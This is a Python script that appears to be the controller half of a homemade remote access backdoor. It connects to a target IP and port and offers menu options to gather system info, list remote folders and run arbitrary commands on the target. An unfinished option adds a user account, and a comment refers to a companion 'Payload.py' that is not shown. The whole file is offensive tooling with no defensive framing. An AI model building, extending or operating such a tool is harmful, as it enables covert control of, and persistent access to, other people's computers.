import socket as sk
from getpass import getpass


def Main():
    IPTarget = input("Enter IP Address to connect to: ")
    PortTarget = int(input("Enter Port to connect to: "))
    ConnTarget = SocketConnect(IPTarget, PortTarget)
    if ConnTarget is not None:
        Menu(ConnTarget)


def SocketConnect(IPTarget, PortTarget):
    s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
    s.connect((IPTarget, PortTarget))
    print(f'Connected to: {IPTarget} on port: {PortTarget}')
    return s


def decode_utf(x):
    x = x.decode('utf-8')
    return x


def Menu(TargetConnection):
    while True:
        print("""`\rSelect Option:\r\n\r\n\t1) System Info\r\n\t2) Check Remote Folder\r\n\t3) Run remote command\r\n\t0) Quit""")
        UserOption = input("\r\nEnter Option: ")
        if UserOption == "1":
            TargetConnection.send(UserOption.encode())
            Result = TargetConnection.recv(1024)
            print("*" * 40 + f"\n{decode_utf(Result)}\n" + "*" * 40)
        elif UserOption == "2":
            Directory = input("Enter remote directory: ")
            TargetConnection.send(UserOption.encode())
            TargetConnection.send(Directory.encode())
            Result = decode_utf(TargetConnection.recv(1024)).split(",")
            print("*" * 40)
            for x in Result:
                print(x)
            print("*" * 40)
        elif UserOption == "3":
            Command = input("Enter Command to run: ")
            TargetConnection.send(UserOption.encode())
            TargetConnection.send(Command.encode())
            Result = TargetConnection.recv(1024)
            print("*" * 40 + f"\n{decode_utf(Result)}\n" + "*" * 40)
        elif UserOption == "4":
            # TODO: Complete functionality for this option
            # TODO: Add functionality to the Payload.py file as well
            username = input("Enter user to add to system: ")
            password = getpass()
            TargetConnection.send(UserOption.encode())
            TargetConnection.send(username.encode())
            Result = TargetConnection.recv(1024)
            print("*" * 40 + f"\n{decode_utf(Result)}\n" + "*" * 40)
        elif UserOption == "0":
            TargetConnection.close()
            break


Main()
